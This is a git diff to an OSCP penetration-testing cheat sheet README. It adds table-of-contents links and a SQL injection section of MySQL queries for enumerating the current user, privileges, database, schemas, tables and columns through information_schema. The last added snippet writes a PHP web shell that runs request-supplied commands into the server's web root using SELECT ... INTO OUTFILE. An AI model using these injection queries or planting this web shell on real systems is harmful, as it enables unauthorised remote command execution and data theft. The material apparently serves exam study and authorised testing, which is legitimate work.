@@ -6,6 +6,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
@@ -56,7 +58,7 @@ This repository describes cheat sheet and knowledge for OSCP.
         - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
 - [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
     - [Debugger](#debugger)
-    - [jwt_tool](#jwt_tool)
+    - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -67,6 +69,13 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [SQL Injection](#sql-injection)
   - [PayloadsAllTheThings](#payloadsallthethings-1)
     - [Insert Statement injection using ON DUPLICATE KEY UPDATE](#insert-statement-injection-using-on-duplicate-key-update)
+    - [Get access user](#get-access-user)
+    - [Get privilege type from user](#get-privilege-type-from-user)
+    - [Get access database](#get-access-database)
+    - [Get schema names](#get-schema-names)
+    - [Get table name from information\_schema](#get-table-name-from-information_schema)
+    - [Get column name from table name](#get-column-name-from-table-name)
+    - [Write shell](#write-shell)
   - [sqlmap](#sqlmap)
     - [Basic Example](#basic-example)
     - [second request](#second-request)
@@ -461,6 +470,43 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
 ### Insert Statement injection using ON DUPLICATE KEY UPDATE
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#insert-statement---on-duplicate-key-update
+
+### Get access user
+```shell
+select user()
+```
+
+### Get privilege type from user
+```shell
+select privilege_type FROM information_schema.user_privileges where grantee = <user name>
+```
+
+### Get access database
+```shell
+select database()
+```
+
+### Get schema names
+```shell
+select schema_name from information_schema.schemata
+```
+
+### Get table name from information_schema
+```shell
+select table_name from information_schema.tables where table_schema = <schema_name>
+```
+
+### Get column name from table name
+```shell
+select column_name from information_schema.columns where table_name = <table_name>
+```
+### Write shell
+```shell
+select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/0xdf.php'
+```
+
+
+
 
 ## sqlmap
 ### Basic Example
